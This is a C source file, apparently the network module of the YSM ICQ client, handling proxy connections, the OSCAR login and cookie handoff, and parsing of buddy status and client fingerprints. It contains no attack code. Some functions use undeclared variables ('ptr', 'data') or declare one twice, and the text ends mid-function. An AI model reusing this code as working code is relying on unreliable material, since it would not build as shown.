#include "ysm.h"
#include "icqv7.h"
#include "charset.h"
#include "wrappers.h"
#include "prompt.h"
#include "slaves.h"
#include "toolbox.h"
#include "setup.h"
#include "direct.h"
#include "output.h"
#include "bytestream.h"
#include "bs_oscar.h"
#include "network.h"
#include "dump.h"

ysm_server_info_t g_sinfo;

int32_t initNetwork(void)
{
    /* zero all sinfo fields */
    memset(&g_sinfo, 0, sizeof(ysm_server_info_t));

    /* Initial seqnum */
    g_sinfo.seqnum = 1;

    /* buddy list information */
    g_sinfo.blgroupsid        = initBs();
    g_sinfo.blusersid         = initBs();
    g_sinfo.blgroupsidentries = 0;
    g_sinfo.blusersidentries  = -1;

    return 0;
}

int32_t YSM_HostToAddress(int8_t *inhost, uint32_t *outaddress)
{
struct hostent    *myhostent;
#if !defined(WIN32) && !defined(_AIX) && !defined(__sun__) && !defined(sun)
struct in_addr    myaddr;
int32_t        retval = 0;
#else
#ifndef    INADDR_NONE
#define    INADDR_NONE    -1
#endif
#endif

    if (inhost == NULL || outaddress == NULL)
        return -1;

    /* first check if we have a number-and-dots notation */
#if !defined(WIN32) && !defined(_AIX) && !defined(__sun__) && !defined(sun)
    retval = inet_aton(inhost, &myaddr);
    if (retval == 0) {
#else
    *outaddress = inet_addr(inhost);
    if (*outaddress == INADDR_NONE) {
#endif
        /* inet_aton failed, we seem to have a hostname
         * instead of a number-and-dots notation as we
         * previously thought
         */

        myhostent = gethostbyname(inhost);
        if (myhostent == NULL) {
            /* unable to resolve hostname */
            return -1;
        }

        /* get the address */
        memcpy(outaddress, myhostent->h_addr, 4);
    }
#if !defined(WIN32) && !defined(_AIX) && !defined(__sun__) && !defined(sun)
    else
        memcpy(outaddress, &myaddr.s_addr, 4);
#endif

    return 0;
}

static int32_t YSM_RawConnect(int8_t *host, uint16_t port)
{
    struct sockaddr_in server;
    int32_t            sock = 0;
    uint32_t          address = 0;

    /* convert host into an ip address if it isn't already */
    if (YSM_HostToAddress(host, &address) < 0)
        return -1;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0)
        return -1;

    server.sin_addr.s_addr = address;
    server.sin_port = htons(port);
    server.sin_family = AF_INET;

    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0)
        return -1;

    return sock;
}

/* ProxyHalfConnect:
 *    Takes care of connecting to the proxy server and
 *    returns in order to allow whatever action against
 *    the proxy server is to be taken.
 *
 */

static int32_t YSM_ProxyHalfConnect(int8_t *host, uint16_t port, struct in_addr *outaddress)
{
    int32_t            proxysock = 0;
    struct in_addr        address;

    if (host == NULL)
        return -1;

    /* make sure minimum proxy configuration exists */
    if (atoi(YSM_USER.proxy.host) == 0x00
        || !YSM_USER.proxy.port)
        return -1;

    /* do we have to resolve the final address ourselves?.
     * the PROXY_RESOLVE flag tells whether we should let
     * the proxy resolve hostnames for us or not.
     * NOTE, make sure we do this before RawConnect so we
     * don't have to close any sockets if failed.
     */

    if (!(YSM_USER.proxy.flags & YSM_PROXY_RESOLVE)) {
        /* we have to resolve the hostname */
        if (YSM_HostToAddress(host, &address.s_addr) < 0)
            return -1;

        if (outaddress != NULL)
            outaddress->s_addr = address.s_addr;
    }

    /* RawConnect takes care of resolving the host for us */
    proxysock = YSM_RawConnect(
                YSM_USER.proxy.host,
                YSM_USER.proxy.port
                );
    if (proxysock < 0)
        return -1;

    return proxysock;
}

static int32_t YSM_ProxyConnect(int8_t *host, uint16_t port)
{
    int32_t          proxysock = 0;
    uint32_t         x = 0;
    struct in_addr   address;
    int8_t           proxy_string[512], *aux = NULL, *auxb = NULL;

    if (host == NULL)
        return -1;

    proxysock = YSM_ProxyHalfConnect(host, port, &address);
    if (proxysock < 0)
        return -1;

    /* we now create the 'proxy_string' buffer to send to the
     * proxy server. It will be different for Authentication req
     * servers.
     */

    /* do we have to authenticate against this proxy? */
    if (YSM_USER.proxy.flags & YSM_PROXY_AUTH) {

        uint8_t    *credential = NULL, *encoded = NULL;
        uint32_t    length = 0;

        length = strlen(YSM_USER.proxy.username);
        length += strlen(YSM_USER.proxy.password);
        length ++;

        credential = ysm_calloc( 1, length+1, __FILE__, __LINE__ );

        snprintf( credential, length,
                "%s:%s",
                YSM_USER.proxy.username,
                YSM_USER.proxy.password );

        credential[length] = 0x00;

        encoded = encode64(credential);
        snprintf( proxy_string, sizeof(proxy_string),
                "CONNECT %s:%d HTTP/1.0\r\n"
                "Proxy-Authorization: Basic %s\r\n\r\n",
                (YSM_USER.proxy.flags & YSM_PROXY_RESOLVE)
                ? (char *)host : inet_ntoa(address),
                port,
                encoded );

        proxy_string[sizeof(proxy_string) - 1] = 0x00;

        YSM_FREE(credential);
        YSM_FREE(encoded);
    }
    else
    {
        snprintf(proxy_string, sizeof(proxy_string),
            "CONNECT %s:%d HTTP/1.0\r\n\r\n",
            (YSM_USER.proxy.flags & YSM_PROXY_RESOLVE)
            ? (char *)host : inet_ntoa(address),
            port);

        proxy_string[sizeof(proxy_string) - 1] = 0x00;
    }

    /* we will now send the 'proxy_string' buffer to the proxy
     * and read the response.
     */

    printfOutput(VERBOSE_PACKET, "%s", proxy_string);

    if (SOCK_WRITE(proxysock, proxy_string, strlen(proxy_string)) < 0)
    {
        /* handle the error correctly */
        close(proxysock);
        return -1;
    }

    /* we use the same send buffer for receiving as well */
    memset(proxy_string, '\0', sizeof(proxy_string));

    /* read the first response */
    if (YSM_READ_LN(proxysock, proxy_string, sizeof(proxy_string)) <= 0)
    {
        close(proxysock);
        return -1;
    }

    /* parse the response */
    strtok(proxy_string,"\n");
    aux = strtok(proxy_string, "/");
    strtok(NULL, " \t");
    auxb = strtok(NULL, " \t");

    if (aux == NULL || auxb == NULL
    || !strstr( aux, "HTTP" ) || !strstr( auxb, "200" ) ) {

        /* if we get to this point, we got an error on the response.
         * check if it's because we require authentication and we
         * didn't supply one. */

        if (auxb != NULL)
        {
            if (strstr(auxb, "401"))
            {
                /* authentication required */
                printfOutput( VERBOSE_BASE, MSG_ERR_PROXY2 );
            }
            else
            {
                printfOutput( VERBOSE_BASE, "Method FAILED (%s %s)\n", auxb, auxb+strlen(auxb)+1);
            }
        }
        else
        {
            /* unknown error in response */
            printfOutput( VERBOSE_BASE, MSG_ERR_PROXY3 );
        }

        /* close the socket and leave */
        close(proxysock);
        return -1;
    }

    /* the response was successfull.
     * this means we are now connected to the proxy server.
     */

    /* read until the end of the headers */
    do {
        x = YSM_READ_LN( proxysock,
                proxy_string,
                sizeof(proxy_string)
                );
    } while (x);


    /* we return the open socket to the proxy server */
    return proxysock;
}

/* YSM_Connect is the main procedure for connecting to
 * servers. It makes use of proxy configuration if any
 * to connect to the proxy servers.
 */

int32_t YSM_Connect(int8_t *host, uint16_t port, int8_t verbose)
{
    int32_t             mysock = -1, try_count = 0;
    uint32_t           serversize = 0;
    struct sockaddr_in  server;

    if (host == NULL || port == 0)
        return -1;

    /* Note, we don't resolve the host address by now because
     * if connecting through proxy, the user might want the
     * proxy to resolve the address by itself.
     */

    /* first check if the user has configured a proxy */
    if (atoi(YSM_USER.proxy.host) != 0x00)
    {
        /* connect through the proxy and retry twice */
        do {
            mysock = YSM_ProxyConnect(host, port);
            try_count ++;
        } while (mysock < 0 && try_count < 2);
    }
    else
    {
        /* connect directly */
        mysock = YSM_RawConnect(host, port);
    }

    if (mysock < 0)
    {
        /* connect has failed */
        return -1;
    }

    /* get our internal IP address through getsockname */
    serversize = sizeof(server);
    getsockname(mysock, (struct sockaddr *)&server, &serversize);
    YSM_USER.d_con.rIP_int = server.sin_addr.s_addr;

    return mysock;
}

/* SignIn to the ICQ Network             */
/* moduled for being able to 'reconnect' */

int networkSignIn(void)
{
    uint16_t port = 0;

    if (YSM_USER.proxy.flags & YSM_PROXY_HTTPS)
        port = 443;
    else
        port = YSM_USER.network.authPort;

    YSM_USER.network.rSocket = YSM_Connect(
        YSM_USER.network.authHost,
        port,
        0x1);

    if (YSM_USER.network.rSocket < 0)
        return YSM_USER.network.rSocket;

    YSM_Init_LoginA(YSM_USER.uin, YSM_USER.password);

    return YSM_USER.network.rSocket;
}

void networkReconnect(void)
{
    slave_t   *slave = NULL;

    /* Starting time is 10 seconds */
    uint32_t   x = 10;
    int32_t    y = 0;

    g_sinfo.flags &= ~FL_LOGGEDIN;
    g_state.reconnecting = TRUE;

    /* Reset slaves status */
    while (slave = getNextSlave(slave))
    {
        slave->status = STATUS_OFFLINE;
    }

    while (y <= 0)
    {
        printfOutput(VERBOSE_BASE,
            "Disconnection detected. "
            "Reconnecting in %d seconds.\n" , x );

        threadSleep(x, 0);

        close(YSM_USER.network.rSocket);

        if ((y = networkSignIn()) < 0)
        {
            if (x < 300)
                x += 5;
            else
            {
                printfOutput(VERBOSE_BASE,
                    "\nMaximum reconnects reached. "
                    "Network must be down..\n" );
                YSM_ERROR(ERROR_NETWORK, 0);
            }
        }
    }
}

static int32_t sendSnac(
    uint8_t       familyId,
    uint8_t       subTypeId,
    uint16_t      flags,
    const int8_t *data,
    uint32_t      size,
    int32_t       lseq,
    uint32_t      reqId)
{
    uint16_t      nseq = 1;
    bsd_t         bsd;
    bs_pos_t      flap;

    nseq += lseq;     /* 1+= last seq == new seq */
    g_sinfo.seqnum = nseq;        /* Update the global SEQ trace! */

    if (reqId == 0)
    {
        srand((unsigned int) time(NULL));
        reqId = rand() & 0xffffff7f;
    }

    bsd = initBs();

    /* FLAP header */
    flap = bsAppendFlapHead(bsd, 0x2, nseq, 0);

    /* SNAC header */
    bsAppendWord(bsd, familyId);  /* family id */
    bsAppendWord(bsd, subTypeId); /* family subtype id */
    bsAppendWord(bsd, flags);     /* SNAC flags */
    bsAppendDword(bsd, reqId);    /* SNAC request id */

    /* copy the data */
    bsAppend(bsd, data, size);
    bsUpdateFlapHeadLen(bsd, flap);

    if (writeBs(YSM_USER.network.rSocket, bsd) < 0)
    {
        freeBs(bsd);
        return -1;
    }

    freeBs(bsd);
    return reqId;
}

void serverResponseHandler(void)
{
    int8_t    *buf = NULL;
    flap_head_t  head;
    int32_t    dataLen = 0, readLen = 0, pos = 0;
    tlv_t      tlv;
    string_t  *str;
    bsd_t      bsd;
    bs_pos_t   pos;

    bsd = initBs();

    bsAppendReadLoop(bsd, YSM_USER.network.rSocket, FLAP_HEAD_SIZE, 0);
    bsRewind(bsd);
    bsReadFlapHead(bsd, &head);
    bsAppendReadLoop(bsd, YSM_USER.network.rSocket, head.len, 0);

    if (bsGetFlag(bsd) & BS_FL_INVALID)
    {
        freeBs(bsd);
        return;
    }

    pos = bsTell(bsd);
    bsRewind(bsd);
    str = initString();
    printfString(str, "IN PACKET\n");
    dumpPacket(str, bsd);
    writeOutput(VERBOSE_PACKET, getString(str));
    freeString(str);
    bsSeek(bsd, pos, BS_SEEK_SET);

    switch (head.channelId)
    {
        case YSM_CHANNEL_NEWCON:
            break;

        case YSM_CHANNEL_SNACDATA:
            incomingFlapSnacData(&head, bsd);
            break;

        case YSM_CHANNEL_FLAPERR:
            break;

        case YSM_CHANNEL_CLOSECONN:
            incomingFlapCloseConnection(&head, bsd);
            break;

        default:
            printfOutput(VERBOSE_MOATA,
                "\nEl channel ID es: %d\n"
                "[ERR] Inexisting channel ID=received"
                "inside a FLAP structure.\n"
                "As I'm a paranoid one.. i'll disconnect.\n",
                head.channelId);
            break;
    }

    freeBs(bsd);
}

static const uint8_t icqCloneIdent[] = {
    0x00,0x01,0x00,0x03,0x00,0x02,0x00,0x01,
    0x00,0x03,0x00,0x01,0x00,0x15,0x00,0x01,
    0x00,0x04,0x00,0x01,0x00,0x06,0x00,0x01,
    0x00,0x09,0x00,0x01,0x00,0x0A,0x00,0x01,
};

static const uint8_t Rates_Acknowledge[] = {
    0x00,0x01,0x00,0x02,0x00,0x03,0x00,0x04,0x00,0x05,
};

void incomingFlapSnacData(flap_head_t *head, bsd_t bsd)
{
    snac_head_t snac;

    bsReadSnacHead(bsd, &snac);

    printfOutput(VERBOSE_MOATA,
        "SNAC id 0x%.2X and sub 0x%.2X\n", snac.familyId, snac.subTypeId);

    switch (snac.familyId)
    {
        case YSM_BASIC_SERVICE_SNAC:
            printfOutput(VERBOSE_MOATA,
                "Basic Service SNAC arrived!\n" );

            switch (snac.subTypeId)
            {
                case YSM_SERVER_IS_READY:
                    printfOutput(VERBOSE_MOATA,
                        "Server Ready. Notifying the "
                        "server that we are an ICQ client\n");

                    sendSnac(0x1, 0x17, 0x0,
                        icqCloneIdent,
                        sizeof(icqCloneIdent),
                        Chars_2_Wordb(head->seq),
                        0);
                    break;

                case YSM_ACK_ICQ_CLIENT:
                    YSM_RequestRates();
                    break;

                case YSM_RATE_INFO_RESP:
                    /* Just an ACK that we received the rates */
                    sendSnac(0x1, 0x08, 0x0,
                        Rates_Acknowledge,
                        sizeof(Rates_Acknowledge),
                        g_sinfo.seqnum++,
                        0);

                    /* ICBM, CAPABILITES, YOU NAME IT! */
                    sendICBMRightsReq();
                    sendBuddyRightsReq();
                    /* Request Personal */
                    YSM_RequestPersonal();
                    break;

                /* This is either a status change Acknowledge
                 * Or a personal information reply.
                 * We check its request ID to be 0x000E as sent
                 * in the first request. If so, proceed with
                 * the startup. Else, it's a status change. */

                /* case YSM_SCREEN_INFO_RESP: same thing */
                case YSM_STATUS_CHANGE_ACK:
                    if (snac.reqId == 0xE000000 || snac.reqId == 0x000000E)
                    {
                        YSM_IncomingPersonal(head, bsd);
                        sendCapabilities();

                        /* If we have no slaves we would */
                        /* be sending an empty packet. */
                        if (getSlavesListLen() > 0)
                            YSM_SendContacts();

                        sendIcbmParams();

                        if (YSM_USER.status != STATUS_INVISIBLE)
                        {
                            YSM_ChangeStatus(YSM_USER.status);
                        }

                        /* SET US AS READY */
                        sendCliReady();
                        sendCheckContactsReq();
                        sendOfflineMsgsReq();
                    }
                    else
                        printfOutput(VERBOSE_MOATA,
                            "Status Changed\n");
                    break;

                default:
                    break;
            }
            break;

        case YSM_MESSAGING_SNAC:
            switch (snac.subTypeId)
            {
                case YSM_MESSAGE_TO_CLIENT:
                    YSM_ReceiveMessage(head, bsd);
                    break;

                case YSM_MESSAGE_FROM_CLIENT:
                    break;

                case YSM_CLIENT_ACK:
                    YSM_Incoming_ClientAck(head, bsd);
                    break;

                case YSM_HOST_ACK:    /* just a srv ack */
                    /* call Incoming_Scan if we were waiting
                     * a reply from a previous scan.
                     */

                    if (0 != g_sinfo.scanqueue)
                        incomingScanRsp(&snac);

                    break;

                case YSM_SRV_MISSED_CALLS:
                    printfOutput(VERBOSE_MOATA,
                        "\n" MSG_AOL_WARNING );
                    break;

                case YSM_CLI_SRV_ERRORMSG:
                    /* We used to have lots of 0x1 subtypes */
                    /* printf's on the screen big mistake! not */
                    /* all of the error-codes are known and */
                    /* they still are useless for us. Plus, no */
                    /* printf's of %s now. Most of these errors */
                    /* are caused by really sucking features of */
                    /* the new-era icq clients, such as plugins. */

                    /* We want this for our WAR mode, */
                    /* undocumented of course ;)  for not wasting */
                    /* time searching in the slaves list, use a */
                    /* global flag, yak :( */

                    if (0 != g_sinfo.scanqueue)
                        incomingScanRsp(&snac);

                    break;

                /* Dont bother the user with new subtypes arriving */
                default:
                    break;
            }
            break;

        case YSM_BUDDY_LIST_SNAC:
            switch (snac.subTypeId)
            {
                case YSM_SRV_ONCOMING_BUD:
                case YSM_SRV_OFFGOING_BUD:
                    YSM_BuddyChangeStatus(&snac, bsd);
                    break;

                case YSM_SRV_REJECT_NOTICE:
                    /* woha this seems serious..mama mia. */
                    break;

                case YSM_SRV_RIGHTS_INFO:
                    /* reply to rights request, just */
                    /* we wont care about the data */
                    break;

                default:
                    printfOutput(VERBOSE_MOATA,
                        "\n[ERR]:  Unknown subtype"
                        ": %x - in Buddy List SNAC\n",
                        snac.subTypeId);
                    break;
            }
            break;

        case YSM_MULTIUSE_SNAC:
            switch (snac.subTypeId)
            {
                case YSM_SRV_SEND_RSP:
                    YSM_IncomingMultiUse(head, &snac, bsd);
                    break;

                default:
                    break;
            }
            break;

        case YSM_ICQV8FUNC_SNAC:
            switch (snac.subTypeId)
            {
                case YSM_SRV_SEND_ROSTER:
                    YSM_BuddyIncomingList(head, bsd);
                    YSM_SendContacts();
                    break;

                case YSM_SRV_ROSTER_OK:
                    break;

                case YSM_SRV_CHANGE_ACK:
                    YSM_BuddyIncomingChange(&snac, bsd);
                    break;

                default:
                    break;
            }
            break;

        case YSM_REGISTRATION_SNAC:
            break;

        default:
            break;
    }
}

void incomingFlapCloseConnection(flap_head_t *head, bsd_t bsd)
{
    int8_t       *a = NULL;
    const int8_t *cookie = NULL;
    uint16_t      cookieLen = 0;
    uint16_t      errorCode;
    tlv_t         tlv;
    bs_pos_t      pos;

    while (bsReadTlv(bsd, &tlv) == SIZEOF_TLV)
    {
        pos = bsTell(bsd);

        switch (tlv.type)
        {
            /* Check if someone else disconnected us        */
            /* by logging in with our UIN #                 */
            case 0x09:
                printfOutput(VERBOSE_BASE, MSG_ERR_SAMEUIN, "\n");
                printfOutput(VERBOSE_BASE,
                    "\n" MSG_ERR_DISCONNECTED "\n");

                YSM_ERROR(ERROR_NETWORK, 0);
                break;

            case 0x01:
                /* skip our UIN */
            case 0x4:
                /* skip the error description url */
            case 0x8e:
                /* reply from server */
                break;

            case 0x5: /* BOS-address:port */
                if ((a = strchr(ptr, ':')) == NULL)
                    return;

                *a++ = '\0';

                memset(YSM_USER.network.cookieHost, '\0', MAX_PATH);
                strncpy(
                    YSM_USER.network.cookieHost,
                    ptr,
                    sizeof(YSM_USER.network.cookieHost) - 1);

                /* 5190 is default */
                YSM_USER.network.cookiePort = (unsigned short)strtol(a, NULL, 10);
                break;

            case 0x6:    /* Cookie is here..hmmm ..comida ;) */
                cookie = bsGetPtr(bsd);
                cookieLen = tlv.len;
                break;

            case 0xC:
                YSM_ERROR(ERROR_NETWORK, 1);
                break;

            case 0x8:
                bsReadWord(bsd, &errorCode);

                switch (errorCode)
                {
                    case 0x1:
                        printfOutput(VERBOSE_BASE, MSG_ERR_INVUIN, "\n");
                        break;

                    case 0x4:
                        printfOutput(VERBOSE_BASE, MSG_ERR_INVPASSWD, "\n");
                        break;

                    case 0x5:
                        printfOutput(VERBOSE_BASE, MSG_ERR_INVPASSWD, "\n");
                        break;

                    case 0x7:
                        printfOutput(VERBOSE_BASE, MSG_ERR_INVUIN, "\n");
                        break;

                    case 0x8:
                        printfOutput(VERBOSE_BASE, MSG_ERR_INVUIN, "\n");
                        break;

                    case 0x15:
                        printfOutput(VERBOSE_BASE, MSG_ERR_TOOMC, "\n");
                        break;

                    case 0x16:
                        printfOutput(VERBOSE_BASE, MSG_ERR_TOOMC, "\n");
                        break;

                    case 0x18:
                        printfOutput(VERBOSE_BASE, MSG_ERR_RATE, "\n");
                        break;
                }

                printfOutput(VERBOSE_BASE, "\n" MSG_ERR_DISCONNECTED "\n");
                YSM_ERROR(ERROR_NETWORK, 0);
                break;

            default:
                DEBUG_PRINT("Unknown TLV type Ox%X", tlv.type);
                break;
        }

        bsSeek(bsd, pos + tlv.len, BS_SEEK_SET);
    }

    if (!(g_sinfo.flags & FL_LOGGEDIN) && a != NULL && cookie != NULL)
    {
        /* server sends BOS address and cookie, so we can continue 
         * login sequence */
        close(YSM_USER.network.rSocket);

        YSM_USER.network.rSocket = YSM_Connect(
            YSM_USER.network.cookieHost,
            YSM_USER.network.cookiePort,
            0x1);

        if (YSM_USER.network.rSocket < 0)
            YSM_ERROR(ERROR_NETWORK, 1);

        /* Generemos nuestro Seq random primario */
        srand((unsigned int)time(NULL));
        g_sinfo.seqnum = rand() % 0xffff;

        /* send cookie to BOS */
        loginSendCookie(cookie, cookieLen);

        g_sinfo.flags |= FL_LOGGEDIN;

        printfOutput(VERBOSE_BASE, "INFO LOGIN_OK\n");
    }
}

void YSM_BuddyChangeStatus(const snac_head_t *snac, bsd_t bsd)
{
    direct_connection_t    dcinfo;
    uint16_t     flags = 0;
    uint16_t     status = STATUS_OFFLINE;
    uint32_t     fprint = 0;
    uint8_t      uinLen = 0;
    time_t        onsince = 0;
    int8_t       *statusStr = NULL;
    int8_t       *puin = NULL;
    slave_t      *victim = NULL;

    if (snac == NULL)
        return;

    bsReadByte(bsd, &uinLen);          /* UIN string length */
    if (uinLen >= MAX_UIN_LEN) return;

    puin = YSM_CALLOC(1, uinLen+1);
    bsReadBuf(bsd, puin, uinLen);      /* UIN string */

//    DEBUG_PRINT("uin: %s", puin);

    victim = querySlave(SLAVE_UIN, NULL, atol(puin), 0);
    if (victim == NULL)
    {
        DEBUG_PRINT(
            "Received a status change for UIN %s which is not "
            "in your list.\n", puin);

        YSM_FREE(puin);
        return;
    }

    memset(&dcinfo, 0, sizeof(dcinfo));

    switch (snac->subTypeId)
    {
        case YSM_SRV_ONCOMING_BUD:
            YSM_BuddyParseStatus(
                    victim,
                    bsd,
                    &dcinfo,
                    &fprint,
                    &status,
                    &flags,
                    &onsince,
                    &statusStr);
            break;

        case YSM_SRV_OFFGOING_BUD:
            DEBUG_PRINT("slave %s went offline.", victim->info.nickName);
            break;

        default:
            DEBUG_PRINT("Unknown subtype id");
            YSM_FREE(puin);
            return;
    }

    YSM_BuddyUpdateStatus(
        victim,
        &dcinfo,
        status,
        flags,
        fprint,
        onsince,
        statusStr);

    YSM_FREE(puin);
}

void YSM_ParseCapabilities(slave_t *victim, int8_t *caps, int32_t len)
{
    int32_t  x, y;
    uint8_t cap_pre[3], capnum[3];

    if (victim == NULL || caps == NULL || len <= 0)
        return;

    victim->caps = 0x00;

    for (x = 0; x < len && ((len-x) >= 16); x += 16)
    {
        memcpy(&cap_pre[0], caps+x, 3);

        if (!memcmp(cap_pre, CAP_PRECAP, 3))
        {
            snprintf(capnum, sizeof(capnum), "%c", *(caps+x+3));

            if (!memcmp(capnum, CAP_SRVRELAY, 2))
            {
                victim->caps |= CAPFL_SRVRELAY;
                printfOutput(VERBOSE_MOATA,
                    "Found AIM Cap: SRVRELAY\n");
            }
            else if (!memcmp(capnum, CAP_ISICQ, 2))
            {

                victim->caps |= CAPFL_ISICQ;
                printfOutput(VERBOSE_MOATA,
                    "Found AIM Cap: ISICQ\n");
            }
            else if (!memcmp(capnum, CAP_UTF8, 2))
            {
                victim->caps |= CAPFL_UTF8;
                printfOutput(VERBOSE_MOATA,
                    "Found AIM Cap: UTF8\n");
            }
            else
            {
                printfOutput(VERBOSE_MOATA,
                    "Unknown AIM capability found:"
                    " \\x%.2X\n", capnum );
            }
            continue;
        }
        else if (!memcmp(cap_pre, CAP_PRERTF, 3))
        {
            snprintf(capnum, sizeof(capnum), "%c", *(caps+x+3));

            if (!memcmp(capnum, CAP_RTF, 2))
            {
                victim->caps |= CAPFL_RTF;
                printfOutput( VERBOSE_MOATA,
                    "Found RTF Cap: RTF\n");
            }
            else
            {
                printfOutput( VERBOSE_MOATA,
                    "Unknown RTF capability found:"
                    " \\x%.2X\n", capnum );
            }
            continue;
        }
        else
        {    /* might be Fingerprinting Capabilities */
            if (!memcmp(caps+x, CAP_M2001, 16))
            {
                printfOutput(VERBOSE_MOATA, "Found fprint Cap: M2001\n");
                victim->fprint = FINGERPRINT_M2000_CLIENT;
            }
            else if (!memcmp(caps+x, CAP_M2001_2, 16))
            {
                printfOutput(VERBOSE_MOATA, "Found fprint Cap: M2001_2\n");
                victim->fprint = FINGERPRINT_M20012_CLIENT;
            }
            else if (!memcmp(caps+x, CAP_M2002, 16))
            {
                printfOutput(VERBOSE_MOATA, "Found fprint Cap: M2002\n");
                victim->fprint = FINGERPRINT_M2002_CLIENT;
            }
            else if (!memcmp(caps+x, CAP_MLITE, 16))
            {
                printfOutput(VERBOSE_MOATA, "Found fprint Cap: ICQ LITE\n");
                victim->fprint = FINGERPRINT_MICQLITE_CLIENT;
            }
            else if (!memcmp(caps+x, CAP_SIMICQ, 16))
            {
                printfOutput(VERBOSE_MOATA, "Found fprint Cap: SIMICQ\n");
                victim->fprint = FINGERPRINT_SIMICQ_CLIENT;
            }
            else if (!memcmp(caps+x, CAP_MICQ, 16))
            {
                printfOutput(VERBOSE_MOATA, "Found fprint Cap: MICQ\n");
                victim->fprint = FINGERPRINT_MICQ_CLIENT;
            }
            else if (!memcmp(caps+x, CAP_TRILL_NORM, 16))
            {
                printfOutput(VERBOSE_MOATA, "Found fprint Cap: TRILLIAN\n");
                victim->fprint = FINGERPRINT_TRILLIAN_CLIENT;
            }
            else if (!memcmp(caps+x, CAP_TRILL_CRYPT, 16))
            {
                printfOutput(VERBOSE_MOATA, "Found fprint Cap: TRILLIAN CRYPT\n");
                victim->fprint = FINGERPRINT_TRILLIAN_CLIENT;
            }
            else if (!memcmp(caps+x, CAP_LICQ, 16))
            {
                printfOutput(VERBOSE_MOATA, "Found fprint Cap: LICQ\n");
                victim->fprint = FINGERPRINT_LICQ_CLIENT;
            }
            else
            {
                printfOutput(VERBOSE_MOATA, "Found an Unknown capability:\n");

                for (y = 0; y < 16; y++)
                    printfOutput( VERBOSE_MOATA,
                        "\\x%.2x", *(caps+x+y));

                printfOutput(VERBOSE_MOATA, "\n");
            }
        }
    }

    /* this is a patch for ICQ2Go who can't take UTF8 */
    if (victim->fprint == FINGERPRINT_MICQLITE_CLIENT
    && !(victim->caps & CAPFL_ISICQ))
    {
        victim->caps &= ~CAPFL_UTF8;
        victim->fprint = FINGERPRINT_ICQ2GO_CLIENT;
        printfOutput(VERBOSE_MOATA, "Found an ICQ2Go Client\n");
    }
}

void YSM_BuddyParseStatus(
    slave_t             *victim,     /* IN */
    bsd_t                bsd,        /* IN */
    direct_connection_t *dcinfo,     /* OUT */
    uint32_t            *fprint,     /* OUT */
    uint16_t            *status,     /* OUT */
    uint16_t            *flags,      /* OUT */
    time_t              *onsince,    /* OUT */
    int8_t             **statusStr)  /* OUT */
{
    uint16_t   newStatus = 0;
    uint16_t   newFlags = 0;
    uint8_t    number;
    uint16_t   type, len, encoding;
    uint8_t    len8;
    int8_t     notfound = TRUE, newfprint[4];
    int8_t     rdcCookie[4];
    tlv_t      tlv;
    int8_t    *tlvPtr = NULL;
    uint16_t   tlvCount;
    string_t  *str;

    if (victim == NULL || data == NULL)
        return;

    ptr += 2;            /* skip warning level */
    READ_UINT16(&tlvCount, ptr);
    tlvPtr = ptr;

//    DEBUG_PRINT("tlvCount: %d", tlvCount);

    for (; tlvCount > 0; tlvCount--)
    {
        READ_TLV(&tlv, tlvPtr);
        ptr = tlvPtr;

        switch (tlv.type)
        {
            case 0x000A:
                if (tlv.len > 0)
                {
                    memcpy(&dcinfo->rIP_ext, ptr, 4);
                }
                break;

            /* Direct Connection Info */
            case 0x000C:
                if (tlv.len > 0)
                {
                    /* Internal IP Address */
                    memcpy(&dcinfo->rIP_int, ptr, 4);

                    /* Port where client is listening */
                    memcpy(&dcinfo->rPort, ptr+6, 2);

                    /* Protocol Version */
                    memcpy(&dcinfo->version, ptr+9, 2);

                    /* DC Cookie */
                    rdcCookie[0] = *(ptr+14);
                    rdcCookie[1] = *(ptr+13);
                    rdcCookie[2] = *(ptr+12);
                    rdcCookie[3] = *(ptr+11);

                    memcpy(&dcinfo->rCookie, rdcCookie, 4);

                    /* Do fingerprinting. First check if theres the YSM
                     * encryption identification, else look for common
                     * YSM clients (old ones) */

                    *fprint = Chars_2_DW(ptr+31);
                    if (*fprint != FINGERPRINT_YSM_CLIENT_CRYPT)
                    {
                        newfprint[0] = *(ptr+26);
                        newfprint[1] = *(ptr+25);
                        newfprint[2] = *(ptr+24);
                        newfprint[3] = *(ptr+23);

                        *fprint = Chars_2_DW(newfprint);
                    }
                }
                break;

            /* Capabilities */
            case 0x000D:
                if (tlv.len > 0)
                {
                    YSM_ParseCapabilities(victim, ptr, tlv.len);
                }
                break;

            case 0x0006:
                notfound = FALSE;
                if (tlv.len > 0)
                {
                    READ_UINT16(&newFlags, ptr);
                    READ_UINT16(&newStatus, ptr);
                }
                break;

            case 0x0003:
                /* time_t */
                if (tlv.len == 0x4)
                {
                    READ_UINT32((int32_t *)onsince, ptr);
                    *onsince -= YSM_USER.delta;
                }

                /* just cheat and quit, we only care */
                /* about the STATUS and online since */
                /* by now. */
                break;

            /* user icon id & hash */
            case 0x001D:
                while (ptr - tlvPtr < tlv.len)
                {
                    READ_UINT16(&type, ptr);
                    READ_UINT8(&number, ptr);
                    READ_UINT8(&len8, ptr);

                    if (type == 0x0002)
                    {
                        /* a status/available message */
                        if (len8 >= 4)
                        {
                            READ_UINT16(&len, ptr);
                            *statusStr = YSM_CALLOC(1, len+1);
                            READ_STRING(*statusStr, ptr, len);
                            READ_UINT16(&encoding, ptr);
                            if (encoding == 0x0001)
                            {
                                /* we have an encoding */
                                READ_UINT16(&len, ptr);
//                                READ_STRING(&statusStr, ptr, len);
                                ptr += len;
                                *statusStr = NULL;
                            }
                            else
                            {
                                YSM_CharsetConvertString(
                                    statusStr,
                                    CHARSET_INCOMING,
                                    MFLAGTYPE_UTF8,
                                    TRUE);
                            }
                        }
                    }
                }
                break;

            default:
                break;
        }

        tlvPtr += tlv.len;
    }

     /* This is really raro, at a beginning I believe i was */
     /* actually receiving the ONLINE status change, but it */
     /* now seems i'm not! Anyways, we know that if its an */
     /* ONCOMING bud message and we dont find the status, */
     /* its online, smart, huh? =) */

    if (notfound)
        *status = STATUS_ONLINE;
    else
        *status = newStatus;

    *flags = newFlags;
}


void YSM_BuddyUpdateStatus(
    slave_t             *victim,
    direct_connection_t *dcinfo,
    uint16_t            status,
    uint16_t            flags,
    uint32_t            fprint,
    time_t               onsince,
    int8_t              *statusStr)
{
    if (victim == NULL || dcinfo == NULL)
        return;

    victim->d_con.rIP_int    = dcinfo->rIP_int;
    victim->d_con.rIP_ext    = dcinfo->rIP_ext;
    victim->d_con.rPort      = htons(dcinfo->rPort);
